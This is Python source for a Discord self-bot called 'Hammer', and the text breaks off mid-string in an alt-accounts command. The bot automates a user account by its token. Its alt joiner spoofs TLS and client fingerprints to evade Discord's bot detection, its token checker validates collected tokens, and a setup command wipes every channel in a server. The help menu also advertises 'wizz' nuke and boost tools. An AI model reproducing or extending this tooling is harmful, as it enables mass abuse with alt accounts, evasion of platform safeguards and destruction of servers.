import importlib
import subprocess
import sys
import os

if '__main__' in sys.modules and 'main' not in sys.modules:
    sys.modules['main'] = sys.modules['__main__']

def check_and_fix_discord():
    need_install = False
    try:
        import discord
        from discord.ext import commands
    except (ImportError, ModuleNotFoundError) as e:
        print(f"[!] Discord library is incomplete or broken: {e}")
        need_install = True

    if need_install:
        print("[*] Performing clean re-installation of discord.py-self...")
        subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y", "discord", "discord.py", "discord.py-self"], check=False)
        subprocess.run([
            sys.executable, "-m", "pip", "install", "--force-reinstall",
            "git+https://github.com/dolfies/discord.py-self.git@bdc4542e6cf76f7e24192cce24d0676e8517c83a"
        ], check=True)
        print("\n[SUCCESS] discord.py-self installed completely! Please restart main.py now.")
        sys.exit(0)

check_and_fix_discord()

import re
import io
import json
import time as t
import base64
import random
import string
import hashlib
import tempfile
import asyncio
import threading
from datetime import datetime, timedelta, timezone
from io import BytesIO, StringIO
from flask import Flask, send_from_directory
from concurrent.futures import ThreadPoolExecutor
from gtts import gTTS
from PIL import Image
import aiohttp

import aiofiles
from threading import Thread
import requests
import tls_client
import qrcode
import pytz
from dateutil import parser as date_parser
import phonenumbers
from base64 import b64encode
from phonenumbers import geocoder, carrier
import blockcypher as ltc
from pystyle import Center, Colorate, Colors
from additional.extra2 import fps

import discord
from discord.ext import commands
try:
    from discord.ext import tasks
except Exception:
    tasks = None

def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

config = load_config()

async def get_prefix(bot, message):
    return config.get("prefix", ".")

def time():
    timezone = pytz.timezone(time_zone)
    time = datetime.now(timezone)
    return time.strftime("%I:%M %p")

def date():
    timezone = pytz.timezone(time_zone)
    date = datetime.now(timezone)
    return date.strftime("%d/%m/%Y")

time_zone = config.get('time_zone', 'UTC')
prefix = get_prefix
token = config.get('token', '')
selfbot_name = config.get('selfbot_name', 'Hammer')
UPLOAD_DIR = "hosted_files"
HOST_URL = f"http://{config.get('IP', 'localhost')}:{config.get('PORT', 5000)}/HammerViewer/"
PORT = config.get("PORT", 5000)
bot_options = {"command_prefix": prefix, "self_bot": True, "help_command": None, "case_insensitive": True}
mag = commands.Bot(**bot_options)
mag.sniped_edited_message_dict = {}
IST = pytz.timezone(time_zone)
os.makedirs(UPLOAD_DIR, exist_ok=True)
app = Flask(__name__)
@app.route("/HammerViewer/<path:filename>")
def serve_file(filename):
    return send_from_directory(UPLOAD_DIR, filename)
def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

Thread(target=run_flask, daemon=True).start()

def center_text(text, width):
    lines = text.split('\n')
    return '\n'.join(line.center(width) for line in lines)

def color_text(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

@mag.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_art = f"""[+]================================] | [ H A M M E R ] | [================================[+]"""
    ascii_art3 = f"""[-]================================] | [ {mag.user.name} ] | [================================[-]"""
    ascii_art4 = f"""[-]================================] | [ CMDS : {len([command.name for command in mag.commands]) + 14} ] | [================================[-]"""
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(ascii_art)))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(ascii_art3)))
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(ascii_art4)))


async def senderror(ctx, header, description):
    webhook_url = config.get("embed_mode_webhook_url")
    if not webhook_url:
        return await send(ctx, header, description, delete_after=30)
    embed = discord.Embed(title=header, description=description, color=discord.Color.red())
    try:
        webhook = discord.Webhook.from_url(webhook_url, client=ctx.bot)
        webhook_message = await webhook.send(embed=embed, wait=True)
        msg = await webhook_message.forward(ctx)
        await webhook_message.delete()
        await msg.delete(delay=30)
    except Exception:
        await send(ctx, header, description, delete_after=30)

@mag.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return 
    elif isinstance(error, commands.MissingRequiredArgument):
        usage = f"Correct usage: `{ctx.prefix}{ctx.command} {ctx.command.signature}`"
        usage = usage.replace("<","TEMP").replace("TEMP","[").replace(">","TEMP").replace("TEMP","]")
        await senderror(ctx, "Missing Argument", f"You're missing a required argument.\n\n{usage}")
    elif isinstance(error, commands.BadArgument):
        usage = f"Correct usage: `{ctx.prefix}{ctx.command} {ctx.command.signature}`"
        await senderror(ctx, "Invalid Argument", f"That doesn't look right. Check your input.\n\n{usage}")
    elif isinstance(error, commands.MissingPermissions):
        await senderror(ctx, "No Permission", "You don’t have the required permissions to do this.")
    elif isinstance(error, commands.BotMissingPermissions):
        await senderror(ctx, "Missing Perms", "I need more permissions to complete this action.")
    elif isinstance(error, commands.NoPrivateMessage):
        await senderror(ctx, "Not in DM", "You can't use this command in DMs.")
    elif isinstance(error, commands.PrivateMessageOnly):
        await senderror(ctx, "DM Only", "This command only works in DMs.")
    elif isinstance(error, commands.CheckFailure):
        if str(error) == "This command can only be used in group chats.":
            await senderror(ctx, "Group Only", "You can only use this command in a group chat.")
        else:
            await senderror(ctx, "Can't Use Here", "You can't use this command in this context.")
    elif isinstance(error, commands.CommandOnCooldown):
        await senderror(ctx, "Cooldown", f"Wait `{error.retry_after:.2f}` seconds before trying again.")
    elif isinstance(error, discord.Forbidden):
        await senderror(ctx, "No Permission", "You don't have permission to do that.")
    elif isinstance(error, commands.CommandInvokeError):
        original_error = error.original
        if isinstance(original_error, discord.Forbidden):
            await senderror(ctx, "No Permission", "You don't have permission to use this command here.")
        elif "premium_subscription_count" in str(error).lower():
            await senderror(ctx, "Server Only", "You can only use this command in a server.")
        elif "member_count" in str(error).lower():
            await senderror(ctx, "Server Only", "You can only use this command in a server.")    
        elif "50013" in str(error):  
            await senderror(ctx, "No Permission", "You don’t have the required permissionsuse this command here.")
        elif "50001" in str(error):  
            await senderror(ctx, "Can't Access", "You don’t have access to do that.")
        elif "50035" in str(error): 
            await senderror(ctx, "Invalid Input", "Something's wrong with your input.")
        else:
            await senderror(ctx, "Error", f"Something went wrong: `{error}`.")
    elif isinstance(error, discord.HTTPException):
        if error.code == 50013:  
            await senderror(ctx, "No Permission", "You don’t have permission for that.")
        elif error.code == 50001:
            await senderror(ctx, "Can't Access", "You're missing access for this.")
        elif error.code == 10003:  
            await senderror(ctx, "Error", "I can't find that channel.")
        elif error.code == 10008:  
            await senderror(ctx, "Error", "That message no longer exists.")
        elif error.code == 50007:  
            await senderror(ctx, "DM Blocked", "I can't send you a DM.")
        else:
            await senderror(ctx, "API Error", f"Something went wrong: `{error}`.")
    elif isinstance(error, discord.NotFound):
        await senderror(ctx, "Error", "Couldn't find what you were looking for.")
    elif isinstance(error, discord.errors.Forbidden):
        await senderror(ctx, "Permission Error", "You don’t have permission for that.")
    else:
        await senderror(ctx, "Unexpected Error", f"An error occurred: `{error}`.")

async def send_webhook(url, content):
    try:
        async with aiohttp.ClientSession() as session:
            if isinstance(content, discord.Embed):
                data = {
                    'embeds': [content.to_dict()]
                }
            elif isinstance(content, str):
                data = {
                    'content': content
                }
            else:
                return
            async with session.post(url, json=data) as response:
                if response.status == 204:
                    pass
                else:
                    print(f"Failed to send webhook: {response.status} - {await response.text()}")
    except Exception as e:
        print(f"Failed to send webhook: {e}")


def replace_emoji_with_shit(text, replacement):
    if text is None: 
        return ""
    return re.sub(r"<a?:\w+:\d+>", replacement, text)

def remove_extra_spaces(text):
    text = re.sub(r'\s+', ' ', text)
    return text.strip()

def filter_to_ansi(text):
    text = re.sub(r"\*\*(.*?)\*\*", r"\033[1m\1\033[0m", text)
    text = re.sub(r"__(.*?)__", r"\033[4m\1\033[0m", text)
    text = re.sub(r"`(.*?)`", r"\033[40m\1\033[0m", text)
    return text


async def send(ctx_or_channel, header, description, footer=None, image=None, thumbnail=None, raw_text=None, delete_after=None):
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    if header == ".":
        header = ""
    if description == ".":
        description = ""    
    if footer == ".":
        footer = ""    
    mode = config.get("mode")
    if delete_after is None:
        delete_after = int(footer) if footer and str(footer).isdigit() else None
        footer = None if delete_after else footer
    user_name = ctx_or_channel.author.name if hasattr(ctx_or_channel, 'author') else 'bot'
    timestamp = time()
    message = None
    if mode == 2 and not config.get("embed_mode_webhook_url"):
        mode = 1
    if mode == 1:
        embed_content = f">>> # {header}\n\n{description}\n"
        if footer:
            embed_content += f"\n**__`{footer}`__**"
        else:
            embed_content += f"\n**__`requested by {user_name} | {timestamp}`__**\n"
        try:
            if isinstance(ctx_or_channel, discord.TextChannel):
                message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
            else:
                message = await ctx_or_channel.reply(embed_content, delete_after=delete_after)
        except discord.HTTPException:
            message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
    elif mode == 2:
        color = int(config.get("embed_colour").lstrip("#"), 16)
        webhook_url = config.get("embed_mode_webhook_url")
        if not webhook_url:
            return None

        embed = discord.Embed(title=header, description=description, color=discord.Color(color))
        if image:
            embed.set_image(url=image)
        if thumbnail:
            embed.set_thumbnail(url=thumbnail)
        if footer:
            embed.set_footer(text=footer)
        else:
            embed.set_footer(text=f"requested by {user_name} | {timestamp}")
        try:
            webhook = discord.Webhook.from_url(webhook_url, client=ctx_or_channel.bot)
            if raw_text:
                webhook_message = await webhook.send(raw_text,embed=embed, wait=True)
            else:
                webhook_message = await webhook.send(embed=embed, wait=True)
            msg = await webhook_message.forward(ctx_or_channel)
            await webhook_message.delete()
            if delete_after:
                await msg.delete(delay=delete_after)
            message = msg
        except discord.Forbidden:
            embed_content = f">>> # {header}\n\n{description}\n"
            if footer:
                embed_content += f"\n**__`{footer}`__**"
            else:
                embed_content += f"\n**__`requested by {user_name} | {timestamp}`__**\n"
            try:
                if isinstance(ctx_or_channel, discord.TextChannel):
                    message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
                else:
                    message = await ctx_or_channel.reply(embed_content, delete_after=delete_after)
            except discord.HTTPException:
                message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
                await webhook_message.delete()
    elif mode == 3:
        description = replace_emoji_with_shit(description.replace("> | **","> **").replace(" **ALL IN ONE Macode-Bot** ","").replace(" **LOADED** **`19`** **MODULES** ",""),"")
        header = replace_emoji_with_shit(header, "")
        if description.endswith("`"):
            description += "\n"
        embed_content = f">>> # {header}\n\n{description}"
        if footer:
            embed_content += f"\n```ini\n[ {footer} ]```"
        else:
            embed_content += f"\n```ini\n[ Requested by {user_name} | {timestamp} ]```\n"
        try:
            if isinstance(ctx_or_channel, discord.TextChannel):
                message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
            else:
                message = await ctx_or_channel.reply(embed_content, delete_after=delete_after)
        except discord.HTTPException:
            message = await ctx_or_channel.send(embed_content, delete_after=delete_after)    
    return message

@mag.event
async def on_command(ctx):
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    webhook_url = config.get("commands_logs_webhook_url")    
    embed = discord.Embed(
        title="📥 Command Executed",
        description=f"**Command:** `{ctx.command}`\n**User:** {ctx.author} (`{ctx.author.id}`)\n**Channel:** <#{ctx.channel.id}> (`{ctx.channel.id}`)",
        color=discord.Color.blue()
    )
    try:
        webhook = discord.Webhook.from_url(webhook_url, client=mag)
        await webhook.send(embed=embed, username="Command Logger")
    except Exception as e:
        pass

@mag.event
async def on_message(message):
    if message.author != mag.user:
        return
    with open('database/autoreactions.json', 'r', encoding='utf-8') as f:
        reactions = json.load(f)
    content_lower = message.content.lower()
    for trigger_word, emoji_input in reactions.items():
        if trigger_word in content_lower:
            emojis = emoji_input.split()
            existing_reactions = [reaction.emoji for reaction in message.reactions]
            for emoji in emojis:
                if emoji in existing_reactions:
                    continue
                if len(existing_reactions) >= 20:
                    break
                try:
                    await message.add_reaction(emoji)
                    existing_reactions.append(emoji)
                except discord.errors.HTTPException as e:
                    print(f"Failed to add reaction {emoji}: {e}")
    with open('database/triggers.json', 'r') as file:
        auto_responses = json.load(file)

    if message.content in auto_responses:
        await message.delete()
        await message.channel.send(auto_responses[message.content])

    await mag.process_commands(message)

@mag.command(aliases=['h'])
async def help(ctx,module = None):   
    modules = [
    "fun", "images", "mods", "alts", "nsfw",
    "text", "wizz", "crypto", "wallet", "checker", "activity", "user",
    "config", "gc", "vc", "other","btool","gw","copy","anuke","greet","autoad"
]      
    modules_count = len(modules)
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    prefix = config.get("prefix")    
    if module is None:
        await ctx.message.delete() 
        content = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **ALL IN ONE SELF-BOT** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:bot:1554757614515261496> **LOADED** **`{modules_count}`** **MODULES** <a:bot:1554757614515261496>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:S_rainbow_fun:1554758074688999446> | **FUN CMDS** **:** **`{prefix}help fun`**\n"
            f"<a:pictures:1554758295003336714> | **IMAGES CMDS** **:** **`{prefix}help images`**\n"  
            f"<a:staff:1554757404972032060> | **MODS CMDS** **:** **`{prefix}help mods`**\n"  
            f"<:discord_black:1554758471260311612> | **ALTS CMDS** **:** **`{prefix}help alts`**\n"  
            f"<a:nsfw:1554758930700435456> | **NSFW CMDS** **:** **`{prefix}help nsfw`**\n"  
            f"<a:text_:1554759237807382551> | **TEXT CMDS** **:** **`{prefix}help text`**\n"  
            f"<a:wizz:1554760593846833202> | **WIZZ CMDS** **:** **`{prefix}help wizz`**\n"  
            f"<:Crypto:1554760816677494895> | **CRYPTO CMDS** **:** **`{prefix}help crypto`**\n"  
            f"<:wallet:1554761003869151252> | **WALLET CMDS** **:** **`{prefix}help wallet`**\n"  
            f"<a:checker:1554761208647655525> | **CHECKER CMDS** **:** **`{prefix}help checker`**\n"  
            f"<a:status:1554761515557462067> | **ACTIVITY CMDS** **:** **`{prefix}help activity`**\n"  
            f"<:user:1554761776535703562> | **USER CMDS** **:** **`{prefix}help user`**\n"  
            f"<:Config:1554761932731584634> | **CONFIG CMDS** **:** **`{prefix}help config`**\n"  
            f"<:chat:1554762245362425917> | **GC CMDS** **:** **`{prefix}help gc`**\n"  
            f"<a:FakeNitroEmoji:1554762881260720158> | **VC CMDS** **:** **`{prefix}help vc`**\n"
            f"<a:boost_2:1554763187210031155> | **BOOST TOOL CMDS** **:** **`{prefix}help btool`**\n"  
            f"<a:giveaway:1554763374259085333> | **GIVEAWAY CMDS** **:** **`{prefix}help gw`**\n"
            f"<a:Welcome:1554765197976277063> | **GREET CMDS** **:** **`{prefix}help greet`**\n"
            f"<:copy:1554765363399364618> | **COPY CMDS** **:** **`{prefix}help copy`**\n"        
            f"<a:anuke:1554765540759699528> | **ANTINUKE CMDS** **:** **`{prefix}help anuke`**\n" 
            f"<a:shop:1554765835862679582> | **AUTO TIC ADS** **:** **`{prefix}help autoad`**\n"          
            f"<a:hero:1554766032428867584> | **OTHER CMDS** **:** **`{prefix}help other`**\n"
            f"<a:lighting:1554766191585661018> | **ALL COMMANDS** **:** **`{prefix}allcmd`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, f"<:rocket1:1554756297143095346>     __{selfbot_name}__    <a:crown:1554756538445336626>",content)
    else:
        if module in modules:
            command = mag.get_command(module)
            if command:
                await ctx.invoke(command)
            else:
                await ctx.invoke("help")
        else:
            await ctx.send(f"Module not found , Type **`{prefix}help`** to get list of modules")

@mag.command()
async def allcmd(ctx):
    await ctx.message.delete()
    cmds = [command.name for command in mag.commands]
    cmds_list = [f"{cmd}" for cmd in cmds]
    chunks = []
    current_chunk = []
    for cmd in cmds_list:
        if len(' ,'.join(current_chunk)) + len(cmd) + 2 > 1500: 
            chunks.append(current_chunk)
            current_chunk = []
        current_chunk.append(cmd)
    if current_chunk:
        chunks.append(current_chunk)
    for i, chunk in enumerate(chunks):
        header = f"**All Cmds Page {i + 1}**"
        content = ", ".join(chunk)
        await send(
            ctx,
            f"<a:pedrit_diamond:1554766364437127199> {header} <a:pedrit_diamond:1554766364437127199>",
            f'**{content}**',
        )

@mag.command()
async def setup(ctx):
    with open("config.json", "r") as f:
        config = json.load(f)
    for channels in ctx.guild.channels:
        await channels.delete()
    await ctx.guild.edit(name=f"{selfbot_name} Setup")
    category = await ctx.guild.create_category(f"{selfbot_name}  setup")
    ping_channel = await ctx.guild.create_text_channel("ping-scan", category=category)
    embed_channel = await ctx.guild.create_text_channel("embed-mode", category=category)
    wallets_channel = await ctx.guild.create_text_channel("wallets", category=category) 
    boost_log_channel = await ctx.guild.create_text_channel("boost-logs", category=category)
    oauth_boost_log_channel = await ctx.guild.create_text_channel("oauth-boost-logs", category=category)
    commands_log_channel = await ctx.guild.create_text_channel("commands-logs", category=category)
    oauth_boost_log_webhook = await oauth_boost_log_channel.create_webhook(name="OAuth Boost Log Webhook")
    boost_logs_webhook = await boost_log_channel.create_webhook(name="Boost Logs Webhook")
    ping_webhook = await ping_channel.create_webhook(name="Ping Scan Webhook")
    embed_webhook = await embed_channel.create_webhook(name="Embed Mode Webhook")
    wallets_webhook = await wallets_channel.create_webhook(name="Wallets Webhook")
    command_logs_webhook = await commands_log_channel.create_webhook(name="Wallets Webhook")
    config["boosting_logs_webhook_url"] = boost_logs_webhook.url
    config["ping_scan_webhook_url"] = ping_webhook.url
    config["embed_mode_webhook_url"] = embed_webhook.url
    config["wallets_webhook_url"] = wallets_webhook.url
    config["oauth_boosting_logs_webhook_url"] = oauth_boost_log_webhook.url
    config["commands_logs_webhook_url"] = command_logs_webhook.url
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)
    await ctx.send("✅ Setup done! Channels, webhooks created & config updated.")


@mag.command()
async def info(ctx):
    await ctx.message.delete()
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    prefix = config.get("prefix")
    bot_prefix = prefix if prefix else "No-Prefix Mode Enabled"
    commands_list = [command.name for command in mag.commands]
    commands_count = len(commands_list) + 14
    latency = round(mag.latency * 1000)
    info = (
        f"<:Config:1554761932731584634> | **Connected With** : **`{mag.user.name}`**\n"
        f"<:Config:1554761932731584634> | **selfbot Name** : **`{selfbot_name}`**\n"
        f"<:Config:1554761932731584634> | **Real Name** : **`aman`**\n"
        f"<:Config:1554761932731584634> | **User ID** : **`{mag.user.id}`**\n"
        f"<:Config:1554761932731584634> | **Total Commands** : **`{commands_count}`**\n"
        f"<:Config:1554761932731584634> | **Current Ping** : **`{latency} ms`**\n"
        f"<:Config:1554761932731584634> | **Prefix** : **`{bot_prefix}`**\n"
        f"<:Config:1554761932731584634> | **Coded In** : **`Python`**\n"
        f"<:Config:1554761932731584634> | **Version** : **`V2`**\n"
        f"<:Config:1554761932731584634> | **Made With :heart: By aman.own**"
    )
    await send(ctx, f"<a:pedrit_diamond:1554766364437127199> __{selfbot_name} Info__ <a:pedrit_diamond:1554766364437127199>", info)

@mag.command()
async def p(ctx, user: discord.User= None):
    await ctx.message.delete()
    user = user or ctx.author
    target_channel = mag.get_channel(1022658564176748614)  
    if not target_channel:
        return
    await target_channel.send(f"+p {user.id}")
    def check(message):
        return (
            message.author.id == 706874685144432641 and
            message.channel.id == target_channel.id and
            len(message.embeds) > 0
        )
    reply = await mag.wait_for("message", check=check)
    await reply.forward(ctx)

import re

@mag.command()
async def view(ctx, message_reference: str = None):
    await ctx.message.delete()
    referenced_message = None
    dm_url_pattern = re.compile(r"https?:\/\/(?:ptb\.|canary\.)?discord\.com\/channels\/@me\/(\d+)\/(\d+)")
    guild_url_pattern = re.compile(r"https?:\/\/(?:ptb\.|canary\.)?discord\.com\/channels\/(\d+)\/(\d+)\/(\d+)")
    if message_reference:
        dm_match = dm_url_pattern.match(message_reference)
        if dm_match:
            channel_id, message_id = map(int, dm_match.groups())
            try:
                channel = await ctx.bot.fetch_channel(channel_id)
                referenced_message = await channel.fetch_message(message_id)
            except Exception as e:
                await senderror(ctx, "HammerViewer", f"Failed to access the DM message: `{e}`")
                return
        else:
            guild_match = guild_url_pattern.match(message_reference)
            if guild_match: 
                _, channel_id, message_id = map(int, guild_match.groups())
                channel = ctx.bot.get_channel(channel_id)
                if channel:
                    try:
                        referenced_message = await channel.fetch_message(message_id)
                    except (discord.NotFound, discord.Forbidden):
                        await senderror(ctx, "HammerViewer", "Could not access the message from the URL provided!")
                        return
                else:
                    await senderror(ctx, "HammerViewer", "Invalid channel in the URL!")
                    return

    elif message_reference and message_reference.isdigit():
        message_id = int(message_reference)
        for channel in ctx.bot.get_all_channels():
            if isinstance(channel, discord.TextChannel):
                try:
                    referenced_message = await channel.fetch_message(message_id)
                    break
                except (discord.NotFound, discord.Forbidden):
                    continue
        if not referenced_message:
            await senderror(ctx, "HammerViewer", "The provided message ID is invalid or not accessible!")
            return

    elif ctx.message.reference:
        referenced_message = await ctx.fetch_message(ctx.message.reference.message_id)
    if not referenced_message:
        await senderror(ctx, "HammerViewer", "You need to reply to a message containing a file, provide a message ID, or a valid message URL!")
        return

    if not referenced_message.attachments:
        await senderror(ctx, "HammerViewer", "The referenced message does not contain a file!")
        return
    file_url = referenced_message.attachments[0].url
    filename = referenced_message.attachments[0].filename
    file_path = os.path.join(UPLOAD_DIR, filename)
    async with aiohttp.ClientSession() as session:
        async with session.get(file_url) as resp:
            if resp.status == 200:
                with open(file_path, "wb") as f:
                    f.write(await resp.read())
                hosted_link = HOST_URL + filename
                await send(ctx, "HammerViewer", f"# <:discord_black:1554758471260311612> [**__View here__**]({hosted_link})")
            else:
                await senderror(ctx, "HammerViewer", "Failed to download the file.")


def build_xsuper():
    session = tls_client.Session(client_identifier="chrome_124")
    request = session.get("https://discord.com/login")

    match = re.search(r'"BUILD_NUMBER":"(\d+)"', request.text)
    build_number = match.group(1) if match else None

    chrome_versions = requests.get("https://googlechromelabs.github.io/chrome-for-testing/latest-versions-per-milestone.json").json()
    latest_milestone = max(map(int, chrome_versions["milestones"].keys()))
    latest_version = chrome_versions["milestones"][str(latest_milestone)]["version"]

    props = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{latest_version} Safari/537.36",
        "browser_version": latest_version,
        "os_version": "10",
        "referrer": "https://discord.com",
        "referring_domain": "discord.com",
        "referrer_current": "https://discord.com",
        "referring_domain_current": "discord.com",
        "release_channel": "stable",
        "client_build_number": build_number,
        "client_event_source": None
    }

    x_super = base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()
    return x_super, latest_version, props["browser_user_agent"]

def create_guild(session, name, headers):
    data = {
        "name": name,
        "icon": None,
        "channels": [],
        "system_channel_id": None
    }
    return session.post("https://discord.com/api/v9/guilds", headers=headers, json=data)

def get_default_channel(session, guild_id, headers):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    resp = session.get(url, headers=headers)
    if resp.status_code == 200:
        for channel in resp.json():
            if channel["type"] == 0:
                return channel["id"]
    return None

def create_invite(session, channel_id, headers):
    url = f"https://discord.com/api/v9/channels/{channel_id}/invites"
    data = {
        "max_age": 0,
        "max_uses": 0,
        "temporary": False,
        "flags": 0
    }
    return session.post(url, headers=headers, json=data)

@mag.command(aliases=['crsrv','createsrv','servercreate','srvcr','srvcreate'])
async def createserver(ctx, *, name: str=None):
    await ctx.message.delete()
    name = name or f"{ctx.author.name}'s Server"
    temp = await send(ctx, "Creating Server", f"**Creating Server with name `{name}`...**")
    tkn = token
    x_super, milestone, user_agent = build_xsuper()
    headers = {
        "Authorization": tkn,
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "X-Super-Properties": x_super,
        "X-Discord-Locale": "en-US",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Timezone": "Asia/Kolkata"
    }
    session = tls_client.Session(client_identifier="chrome_124", random_tls_extension_order=True)
    resp = create_guild(session, name, headers)
    if resp.status_code != 201:
        return await send(ctx, "❌ Failed", f"Failed to create Server.\n`{resp.text}`")
    guild_id = resp.json()["id"]
    await asyncio.sleep(2)
    channel_id = get_default_channel(session, guild_id, headers)
    if not channel_id:
        return await send(ctx, "⚠️ Server Created", "Server was created, but no default channel was found to create an invite.")
    invite_resp = create_invite(session, channel_id, headers)
    if invite_resp.status_code == 200:
        invite_code = f"{invite_resp.json()['code']}"
        invite_url = f"https://discord.gg/{invite_code}"
        await temp.delete()
        await send(ctx, "Server Created", f"**Server created successfully!**\n**Name :** **`{name}`**\n**Server ID :** **`{guild_id}`**\n**Invite :** **{invite_url}** ")
        await ctx.send(f"discord.gg/{invite_code}")
    else:
        await send(ctx, "Server Created", "**Server was created, but couldn’t create an invite link.**")

class alts(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_cookies(self) -> dict:
        try:
            response = requests.get("https://discord.com").cookies
            cookies = {
                "__dcfduid": response.get("__dcfduid"),
                "__sdcfduid": response.get("__sdcfduid"),
                "_cfuvid": response.get("_cfuvid"),
                "__cfruid": response.get("__cfruid"),
            }
            return cookies
        except Exception as e:
            return {}

    def ran_str(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    async def join_with_token(self, token, invite, ctx):
        try:
            chrome = "126"
            fingerprint_dict = random.choice(fps)
            ja3 = fingerprint_dict["ja3"]
            user_agent = fingerprint_dict["user-agent"]
            x_super_properties = fingerprint_dict["x-super-properties"]

            session = tls_client.Session(
                client_identifier="chrome_" + chrome,
                random_tls_extension_order=True,
                ja3_string=ja3,
            )
            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": token,
                "content-type": "application/json",
                "origin": "https://discord.com",
                "priority": "u=1, i",
                "referer": "https://discord.com",
                "sec-ch-ua": f'"Not)A;Brand";v="99", "Microsoft Edge";v="{chrome}", "Chromium";v="{chrome}"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "en-US",
                "x-discord-timezone": "Asia/Katmandu",
                "x-super-properties": x_super_properties,
            }
            join_data = {"session_id": self.ran_str()}
            response = session.post(
                f"https://discord.com/api/v9/invites/{invite}",
                headers=headers,
                json=join_data,
                cookies=self.get_cookies(),
            )
            if response.status_code == 200:
                success_msg = f"<a:pedrit_diamond:1554766364437127199> ### Successfully joined using : `{token[:20]}*******`"
                return True
            elif response.status_code == 403 and "captcha" in response.text.lower():
                captcha_msg = f"<:discord_black:1554758471260311612>  ### Got captcha while joining using : `{token[:20]}*******`"
                return False
            else:
                failure_msg = f"<:discord_black:1554758471260311612>  ### Unable to join using : `{token[:20]}*******`"
                return False
        except Exception as e:
            error_msg = f"<:discord_black:1554758471260311612>  ### Exception occurred while joining using : `{token[:20]}*****`: {str(e)}"
            return False

    async def update_result_message(self, ctx, result_message, msg, page_count):
        if len(result_message.content) + len(msg) + 1 > 2000:  
            new_page_message = await ctx.send(f"Joiner result page {page_count + 1}")
            result_message = new_page_message
            page_count += 1 
        updated_content = result_message.content + f"\n> {msg}" if result_message.content else f"> {msg}"
        await result_message.edit(content=updated_content)
        return result_message, page_count

    async def check_token(self, token):
        try:
            token = token.strip().strip('"').strip("'")
            if ":" in token:
                parts = token.split(":")
                token = parts[2].strip() if len(parts) >= 3 and "@" in parts[0] else parts[-1].strip()
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }
            data = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)

            if data.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            return False 

    @commands.command(aliases=['alt'])
    async def alts(self, ctx):
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as file:
                tokens = file.read().splitlines()
                loaded_tokens_count = len(tokens)
        except FileNotFoundError:
            loaded_tokens_count = 0
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()            
        content = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
